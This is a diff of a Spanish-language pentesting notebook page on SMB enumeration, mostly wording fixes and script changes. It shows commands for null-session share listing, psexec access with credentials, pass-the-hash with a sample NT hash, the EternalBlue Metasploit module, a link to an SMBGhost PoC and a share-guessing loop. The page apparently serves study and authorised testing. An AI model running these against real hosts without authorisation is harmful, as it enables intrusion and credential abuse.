@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
     <title>139,445 - SMB | Notebook</title>
+    <script src="/theme.js"></script>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -12,59 +13,7 @@
       <a class="back-link" href="/notebook.html">~/notebook</a>
 
       <section class="notebook-workspace" aria-label="Notebook">
-        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
-          <h1>Notebook</h1>
-
-          <nav class="vault-tree" aria-label="Ficheros">
-            <a class="vault-file" href="/notebook.html">Inicio</a>
-            <details class="vault-folder">
-              <summary>Pivoting</summary>
-              <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
-              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
-              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Hacking Wifi</summary>
-              <a class="vault-file" href="/notebook/hacking-wifi/captura-wpa-wpa2.html">Captura WPA/WPA2</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Enumeración de Puertos</summary>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/21-ftp.html">21 - FTP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/22-ssh.html">22 - SSH</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/23-telnet.html">23 - Telnet</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/25-smtp.html">25 - SMTP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
-              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
-            </details>
-            <details class="vault-folder">
-              <summary>Escalada de Privilegios</summary>
-              <details class="vault-folder vault-subfolder" open>
-                <summary>Linux</summary>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
-                <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
-              </details>
-              <details class="vault-folder vault-subfolder">
-                <summary>Windows</summary>
-              </details>
-            </details>
-          </nav>
-        </aside>
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
 
         <article class="note-panel is-active" id="139-445-smb">
           <div class="note-tabbar">
@@ -87,14 +36,14 @@
             <h3>Enumeración</h3>
 
             <section class="code-card">
-              <h3>Enumerar Shares</h3>
-              <pre><code># Probar siempre con  # Null Sesion # Guest user # Credenciales
+              <h3>Enumerar shares</h3>
+              <pre><code># Probar siempre con null session, usuario guest y credenciales válidas si existen
 crackmapexec smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; --shares                  
 smbclient -L &lt;ip&gt; -N</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Permisos Shares</h3>
+              <h3>Permisos en shares</h3>
               <pre><code>smbmap -H &lt;ip&gt; 
 smbmap -H &lt;ip&gt; -u &#x27;null&#x27;
 smbmap -H &lt;ip&gt; -r &lt;recurso&gt;/&lt;directorio&gt;
@@ -102,7 +51,7 @@ smbmap -H &lt;ip&gt; -u guest -p &quot;&quot; -d .</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Acceso a Shares</h3>
+              <h3>Acceso a shares</h3>
               <pre><code>smbclient //&lt;ip&gt;/&lt;recurso&gt; -N 
 smbclient //&lt;ip&gt;/&lt;recurso&gt; -U &lt;usuario&gt;
 smbclient //&lt;ip&gt;/&lt;recurso&gt; -U &lt;usuario&gt;%&lt;contraseña&gt;</code></pre>
@@ -145,7 +94,7 @@ enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;</code></pre>
 
             <h3>Acceso SMB</h3>
 
-            <p>Cuando validamos en crackmapexec unas credenciales vemos si aparece <code>Pwned</code>. Significa que el usuario pertenece al grupo <code>Admins Local</code> y puede conectarse con <code>psexec</code> a esa máquina.</p>
+            <p>Cuando validamos credenciales con crackmapexec/nxc, el indicador <code>Pwned</code> suele significar que el usuario tiene privilegios suficientes para ejecutar comandos remotos en esa máquina, normalmente por pertenecer al grupo de administradores locales. Aun así, conviene confirmarlo porque depende del protocolo, la versión de la herramienta y las políticas del host.</p>
 
             <section class="code-card">
               <h3>psexec.py &lt;User&gt;@&lt;ip_target&gt; command</h3>
@@ -154,12 +103,12 @@ enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;</code></pre>
 impacket-psexec &lt;user&gt;:&lt;password&gt;@&lt;ip_target&gt;</code></pre>
             </section>
 
-            <h3>Pass The Hash</h3>
+            <h3>Pass-the-Hash</h3>
 
             <section class="code-card">
               <h3>HASH: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d</h3>
               <pre><code># Administrator                             Usuario
-# 500                                       Grupo RID
+# 500                                       RID del usuario Administrator
 # aad3b435b51404eeaad3b435b51404ee          LM deshabilitado
 # e3c61a68f1b89ee6c8ba9507378dc88d          HASH NT</code></pre>
             </section>
@@ -188,9 +137,9 @@ exploit</code></pre>
             <h3>Versiones Vulnerables</h3>
 
             <section class="code-card">
-              <h3>EternalBlue (MS17-010): Windows Antiguo y SMBv1</h3>
+              <h3>EternalBlue (MS17-010): Windows antiguo y SMBv1</h3>
               <pre><code>msfconsole -q
-# Comproabar vulnerabilidad
+# Comprobar vulnerabilidad
 use exploit/windows/smb/ms17_010
 
 # Explotar vulnerabilidad
@@ -202,7 +151,7 @@ exploit</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Version SMB</h3>
+              <h3>Versión SMB</h3>
               <pre><code># Metasploit
 msfconsole -q
 use auxiliary/scanner/smb/smb_version
@@ -221,7 +170,7 @@ run</code></pre>
 -[] Windows 10</code></pre>
             </section>
 
-            <p>Explota un RCE: <a href="https://www.exploit-db.com/exploits/48537">PoC Exploit</a></p>
+            <p>SMBGhost es una vulnerabilidad de tipo RCE asociada a SMBv3.1.1 en versiones concretas de Windows 10/Server. Validar siempre versión, parches y entorno antes de probar una PoC: <a href="https://www.exploit-db.com/exploits/48537">PoC Exploit</a>.</p>
 
             <h3>Buscar Recursos Ocultos</h3>
 
@@ -234,7 +183,7 @@ wordlist=&quot;/ruta/shares.txt&quot;
 
 while read -r share; do
 	if smbclient -N &quot;//$ip_target/$share&quot; &amp;&gt;/dev/null; then
-		echo &quot;Recurso con null sesion encontrado: $share&quot;
+		echo &quot;Recurso con null session encontrado: $share&quot;
 	fi
 done &lt; &quot;$wordlist&quot;</code></pre>
             </section>
@@ -266,7 +215,9 @@ done &lt; &quot;$wordlist&quot;</code></pre>
         </article>
       </section>
     </main>
-    <script src="/notebook/folder-state.js"></script>`r`n    <script src="/notebook/search.js"></script>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
   </body>
 </html>
 
